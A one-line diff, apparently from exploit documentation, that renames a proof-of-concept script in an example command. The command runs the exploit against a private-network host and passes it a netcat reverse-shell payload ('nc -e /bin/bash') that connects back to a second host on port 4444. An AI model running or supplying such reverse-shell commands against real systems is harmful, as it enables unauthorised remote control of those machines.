@@ -1,1 +1,1 @@
-$ python3 poc.py 10.0.2.5 'nc -nv -e /bin/bash 10.0.2.15 4444'
+$ python3 poc3.py 10.0.2.5 'nc -nv -e /bin/bash 10.0.2.15 4444'
